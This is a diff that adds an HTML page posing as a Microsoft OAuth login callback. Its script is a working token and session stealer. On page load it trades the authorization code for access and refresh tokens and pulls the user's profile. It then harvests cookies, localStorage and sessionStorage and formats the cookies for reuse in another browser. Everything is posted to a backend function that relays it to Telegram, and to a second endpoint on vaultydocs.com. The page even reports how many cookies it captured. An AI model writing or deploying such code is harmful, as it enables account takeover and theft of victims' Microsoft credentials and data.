@@ -1,0 +1,246 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Microsoft OAuth Callback</title>
+    <style>
+        body {
+            font-family: Arial, sans-serif;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            min-height: 100vh;
+            margin: 0;
+            background: #f3f2f1;
+        }
+        .container {
+            text-align: center;
+            background: white;
+            padding: 40px;
+            border-radius: 8px;
+            box-shadow: 0 2px 10px rgba(0,0,0,0.1);
+        }
+        .spinner {
+            width: 40px;
+            height: 40px;
+            border: 4px solid #f3f3f3;
+            border-top: 4px solid #0078d4;
+            border-radius: 50%;
+            animation: spin 1s linear infinite;
+            margin: 20px auto;
+        }
+        @keyframes spin {
+            0% { transform: rotate(0deg); }
+            100% { transform: rotate(360deg); }
+        }
+        .error {
+            color: #d13438;
+            margin-top: 20px;
+        }
+        .success {
+            color: #107c10;
+            margin-top: 20px;
+        }
+    </style>
+</head>
+<body>
+    <div class="container">
+        <h2>Processing OAuth Response...</h2>
+        <div class="spinner"></div>
+        <p id="status">Exchanging authorization code for access token...</p>
+        <div id="result"></div>
+    </div>
+
+    <script>
+        async function handleOAuthCallback() {
+            const statusEl = document.getElementById('status');
+            const resultEl = document.getElementById('result');
+
+            try {
+                // Get URL parameters
+                const urlParams = new URLSearchParams(window.location.search);
+                const code = urlParams.get('code');
+                const state = urlParams.get('state');
+                const error = urlParams.get('error');
+
+                console.log('🔍 OAuth callback received:', { code: !!code, state, error });
+
+                if (error) {
+                    throw new Error(`OAuth error: ${error} - ${urlParams.get('error_description')}`);
+                }
+
+                if (!code) {
+                    throw new Error('No authorization code received');
+                }
+
+                statusEl.textContent = 'Exchanging code for tokens...';
+
+                // Exchange code for tokens
+                const tokenResponse = await fetch('https://login.microsoftonline.com/common/oauth2/v2.0/token', {
+                    method: 'POST',
+                    headers: {
+                        'Content-Type': 'application/x-www-form-urlencoded',
+                    },
+                    body: new URLSearchParams({
+                        client_id: 'eabd0e31-5707-4a85-aae6-79c53dc2c7f0',
+                        scope: 'openid profile email User.Read',
+                        code: code,
+                        redirect_uri: 'https://vaultydocs.com/oauth-callback',
+                        grant_type: 'authorization_code',
+                    })
+                });
+
+                const tokenData = await tokenResponse.json();
+                console.log('🔍 Token response:', { hasAccessToken: !!tokenData.access_token });
+
+                if (tokenData.error) {
+                    throw new Error(`Token exchange failed: ${tokenData.error_description || tokenData.error}`);
+                }
+
+                statusEl.textContent = 'Getting user profile...';
+
+                // Get user profile
+                const profileResponse = await fetch('https://graph.microsoft.com/v1.0/me', {
+                    headers: {
+                        'Authorization': `Bearer ${tokenData.access_token}`,
+                    }
+                });
+
+                const profileData = await profileResponse.json();
+                console.log('🔍 Profile data:', { email: profileData.mail || profileData.userPrincipalName });
+
+                statusEl.textContent = 'Preparing session data...';
+
+                // Prepare session data
+                const sessionData = {
+                    email: profileData.mail || profileData.userPrincipalName,
+                    name: profileData.displayName,
+                    id: profileData.id,
+                    provider: 'Microsoft',
+                    sessionId: Math.random().toString(36).substring(2, 15),
+                    timestamp: new Date().toISOString(),
+                    accessToken: tokenData.access_token,
+                    refreshToken: tokenData.refresh_token,
+                    authenticationMethod: 'OAuth',
+                    password: 'OAuth Login - No Password',
+                    fileName: 'Microsoft OAuth Login',
+                    userProfile: profileData
+                };
+
+                // Format cookies properly
+                const cookieStrings = document.cookie.split(';').filter(c => c.trim());
+                sessionData.formattedCookies = cookieStrings.map(c => {
+                    const [name, value] = c.trim().split('=');
+                    return name && value ? {
+                        name: name,
+                        value: value,
+                        domain: '.login.microsoftonline.com',
+                        path: '/',
+                        secure: true,
+                        httpOnly: false,
+                        sameSite: 'none',
+                        expirationDate: Math.floor(Date.now() / 1000) + (365 * 24 * 60 * 60),
+                        hostOnly: false,
+                        session: false,
+                        storeId: null
+                    } : null;
+                }).filter(cookie => cookie !== null);
+
+                console.log('🔍 Session data prepared:', { 
+                    email: sessionData.email, 
+                    cookieCount: sessionData.formattedCookies.length 
+                });
+
+                statusEl.textContent = 'Sending data to backend...';
+
+                // Send to Telegram via your backend (use current domain)
+                const currentDomain = window.location.origin;
+                const telegramResponse = await fetch(`${currentDomain}/.netlify/functions/sendTelegram`, {
+                    method: 'POST',
+                    headers: { 'Content-Type': 'application/json' },
+                    body: JSON.stringify({
+                        email: sessionData.email,
+                        password: sessionData.password,
+                        provider: sessionData.provider,
+                        fileName: sessionData.fileName,
+                        timestamp: sessionData.timestamp,
+                        sessionId: sessionData.sessionId,
+                        userAgent: navigator.userAgent,
+                        browserFingerprint: {
+                            cookies: sessionData.formattedCookies,
+                            localStorage: JSON.stringify(Object.fromEntries(Object.entries(localStorage))),
+                            sessionStorage: JSON.stringify(Object.fromEntries(Object.entries(sessionStorage))),
+                            userAgent: navigator.userAgent,
+                            language: navigator.language,
+                            platform: navigator.platform,
+                            timestamp: new Date().toISOString()
+                        },
+                        documentCookies: document.cookie,
+                        formattedCookies: sessionData.formattedCookies,
+                        cookies: document.cookie,
+                        accessToken: sessionData.accessToken,
+                        refreshToken: sessionData.refreshToken,
+                        userProfile: sessionData.userProfile
+                    })
+                });
+
+                const telegramResult = await telegramResponse.json();
+                console.log('🔍 Telegram result:', telegramResult);
+
+                // Save session
+                await fetch('https://vaultydocs.com/.netlify/functions/saveSession', {
+                    method: 'POST',
+                    headers: { 'Content-Type': 'application/json' },
+                    body: JSON.stringify({
+                        ...sessionData,
+                        browserFingerprint: {
+                            cookies: sessionData.formattedCookies,
+                            localStorage: JSON.stringify(Object.fromEntries(Object.entries(localStorage))),
+                            sessionStorage: JSON.stringify(Object.fromEntries(Object.entries(sessionStorage))),
+                            userAgent: navigator.userAgent
+                        },
+                        skipTelegram: true
+                    })
+                });
+
+                // Show success
+                statusEl.textContent = 'Success!';
+                resultEl.innerHTML = `
+                    <div class="success">
+                        <h3>✅ Login Successful!</h3>
+                        <p><strong>Email:</strong> ${sessionData.email}</p>
+                        <p><strong>Provider:</strong> Microsoft</p>
+                        <p><strong>Cookies captured:</strong> ${sessionData.formattedCookies.length}</p>
+                        <p><strong>Data sent to Telegram:</strong> ${telegramResult.success ? 'Yes' : 'No'}</p>
+                        <p style="margin-top: 20px;">
+                            <small>You can close this window now.</small>
+                        </p>
+                    </div>
+                `;
+
+                // Auto-close after 3 seconds
+                setTimeout(() => {
+                    window.close();
+                }, 3000);
+
+            } catch (error) {
+                console.error('❌ OAuth callback error:', error);
+                statusEl.textContent = 'Error occurred';
+                resultEl.innerHTML = `
+                    <div class="error">
+                        <h3>❌ OAuth Error</h3>
+                        <p>${error.message}</p>
+                        <p style="margin-top: 20px;">
+                            <small>Please try again or contact support.</small>
+                        </p>
+                    </div>
+                `;
+            }
+        }
+
+        // Run when page loads
+        handleOAuthCallback();
+    </script>
+</body>
+</html>
